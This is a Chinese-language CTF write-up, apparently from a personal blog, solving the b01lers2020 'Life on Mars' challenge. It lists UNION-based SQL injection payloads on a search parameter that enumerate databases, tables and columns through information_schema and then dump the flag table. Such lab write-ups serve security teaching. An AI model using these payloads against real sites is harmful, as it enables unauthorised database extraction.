---
title: '[b01lers2020]Life on Mars'
date: 2024-07-15 20:06:58
tags: sql注入
categories: 刷题笔记
---

## [b01lers2020]Life on Mars（sql注入）

我们打开页面，发现啥信息都没有，我们随便点击一个地名抓包看看

![image-20240715203732986](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152037033.png)

我们访问/query?search=amazonis_planitia

<img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152039757.png" alt="image-20240715203901604" style="zoom:150%;" />

我们进行sql注入

<!--more-->

先查询数据库

```
?search=amazonis_planitia union select 1,database();
```

得到库名aliens

![image-20240715204104392](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152041533.png)

再查询表名

```
?search=amazonis_planitia union select 1,group_concat(table_name) from information_schema.tables where table_schema="aliens";
```

![image-20240715204341022](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152043093.png)

看不出啥玩意

我们猜测可能还存在其他的库

```
?search=amazonis_planitia union select 1,group_concat(schema_name) from information_schema.schemata;
```

![image-20240715204501018](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152045247.png)

果然还存在其它的库information_schema,alien_code,aliens

我们查询alien_code的表

```
?search=amazonis_planitia union select 1,group_concat(table_name) from information_schema.tables where table_schema="alien_code";
```

![image-20240715205305130](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152053383.png)

我们查询code的字段

```
?search=amazonis_planitia union select 1,group_concat(column_name) from information_schema.columns where table_name="code";
```

![image-20240715205356863](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152053018.png)

我们查询code字段的内容

```
?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code;
```

得到flag

![image-20240715205545439](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407152055505.png)
